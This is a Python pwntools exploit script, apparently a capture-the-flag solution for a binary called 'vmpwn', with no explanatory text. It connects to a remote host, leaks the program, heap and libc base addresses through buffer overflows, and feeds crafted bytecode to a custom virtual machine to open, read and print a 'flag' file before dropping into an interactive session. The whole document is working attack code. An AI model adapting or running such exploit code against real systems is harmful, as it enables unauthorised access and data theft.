from pwn import *
io=remote('219.219.61.234',23457)
#io = remote('127.0.0.1',10001)
#io = process('./vmpwn')
#libc=ELF('libc-2.23.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#context.log_level = 'debug'
io.recv()
pay='a'*0x100
io.send(pay)
io.recvuntil('a'*0x100)
elf_base=u64(io.recv(6)+'\x00\x00')-0x203851

pay='b'*0xf0+'d'*0x10+p64(elf_base+0x203020)

io.send(pay)
io.recvuntil('tell me what is your name:')

pay='a'*0xf0

io.send(pay)
io.recvuntil('a'*0xf0)
heap_base=u64(io.recv(6)+'\x00\x00')

success('heap_base:'+hex(heap_base))
# pause()
def call(a,b,c,ord):
	pay1='\x11'
 	pay1+=p64(a)
	pay1+='\x12'
 	pay1+=p64(b)
 	pay1+='\x13'
 	pay1+=p64(c)
 	pay1+='\x8f'
 	if ord==0:
 		pay1+='\x00'
 	if ord==1:
 		pay1+='\x01'
 	if ord==2:
 		pay1+='\x02'
 	return pay1

pay2=call(1,elf_base+0x2038E0,0x8,1)
pay2+=call(0,elf_base+0x2038f8,0x8,0)
pay2+=call(0,heap_base+0x2D18+0x110+87,0x1000,0)
pay=''

print len(pay2)
pay=pay.ljust(0x100,'\x00')+p64(heap_base+0x2D18+0x110)+'\x00'*8
pay+=pay2
io.send(pay)

libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['read']
libc.address=libc_base

system_addr=libc_base + libc.sym['system']
bin_sh_addr=libc_base + libc.search('/bin/sh\x00').next()
io.send(p64(libc.sym['open']))
pay=''
pay+='\x11flag\x00\x00\x00\x00'
pay+='\x33'+'\x00'*8
pay+='\x20'+'\x00'*8
pay+='\x12'
pay+=p64(0)
pay+='\x13'
pay+=p64(0)
pay+='\x8f'
pay+='\x03'
pay+=call(3,heap_base+0x2D18,0x30,0)
pay+=call(1,heap_base+0x2D18,0x30,1)
pay+=call(0,heap_base+0x2D18,0x1000,0)+'\xff'
io.send(pay)
#gdb.attach(io)
success('libc_base:'+hex(libc_base))
success('heap_base:'+hex(heap_base))
success('elf_base:'+hex(elf_base))
io.interactive()
